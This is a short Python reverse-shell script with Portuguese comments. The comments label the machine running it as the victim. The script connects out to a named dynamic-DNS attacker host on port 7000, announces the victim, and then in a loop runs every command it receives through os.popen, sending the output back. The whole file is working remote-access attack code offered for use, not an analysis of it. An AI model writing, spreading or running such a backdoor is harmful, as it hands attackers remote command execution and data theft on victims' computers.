import os, socket #Importando socket e os 

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #Definindo o tipo de socket que vamos utilizar 

#Agora vamos passar como parametro o domínio no-ip do atacante 
host = socket.gethostbyname('felfspf93.ddns.net') #A função gethostbyname retorna o ip do domínio 

s.connect((host, 7000)) #Se conectando ao client 
s.send('Vítima conectou-se...   ') #Enviando mensagem ao client 

while True: #Looping infinito 

    try: 

        data = s.recv(512) #Esperando receber comando do client 

        if data.startswith('cd'): #Se o comando for cd retira o \n do final 
            os.chdir(data[3:].replace('\n','')) 
            s.send('movendo para '+str(os.getcwd())) #Enviando localização ao client 
            result='\n' 
         
        elif data == 'quit': #Se for quit fecha a conexão e sai do looping 
            s.close() 
            break 
             
        else: 
            result = os.popen(data).read() #O comando é executado e o resultado salvo na variavel result 

            if(result != ''): #Se o resultado for vazio 
                s.send(result) #Envia resultado 
            else: 
                s.send('Comando recebido') #Envia mensagem de confirmação da chegada do comando 

    except: #Fecha a conexão e sai do looping 
        s.close() 
        break  